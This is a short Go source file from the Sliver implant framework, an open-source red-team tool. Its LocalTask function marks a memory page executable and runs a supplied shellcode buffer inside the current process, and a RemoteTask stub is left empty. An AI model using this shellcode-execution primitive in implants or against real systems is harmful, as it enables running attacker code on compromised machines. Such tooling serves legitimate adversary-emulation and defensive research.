package taskrunner

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"runtime"
	"syscall"
	"unsafe"
)

// Get the page containing the given pointer
// as a byte slice.
func getPage(p uintptr) []byte {
	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
}

// LocalTask - Run a shellcode in the current process
// Will hang the process until shellcode completion
func LocalTask(data []byte) error {
	dataAddr := uintptr(unsafe.Pointer(&data[0]))
	page := getPage(dataAddr)
	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
	dataPtr := unsafe.Pointer(&data)
	funcPtr := *(*func())(unsafe.Pointer(&dataPtr))
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	go func(fPtr func()) {
		fPtr()
	}(funcPtr)
	return nil
}

// RemoteTask -
func RemoteTask(processID int, data []byte) error {
	return nil
}
